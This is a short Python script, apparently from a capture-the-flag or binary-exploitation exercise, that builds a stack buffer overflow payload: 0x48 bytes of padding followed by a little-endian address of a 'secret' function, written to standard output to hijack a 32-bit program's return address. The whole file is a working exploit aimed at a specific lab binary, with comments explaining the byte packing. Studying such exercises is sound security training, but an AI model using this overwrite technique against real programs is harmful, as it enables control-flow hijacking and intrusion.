#!/usr/bin/env python

import os
import struct

# Returns a byte object in little endian format.
def p32(num):
	return struct.pack("<I", num)

offset = 0x48
secret_func_address = 0x080491a7

# We must append objects of the same type. So, in order to append the byte object
# returned by p32, we must convert the string to a byte object, using 'b'.
payload = offset * b"A" + p32(secret_func_address)

os.write(1, payload)
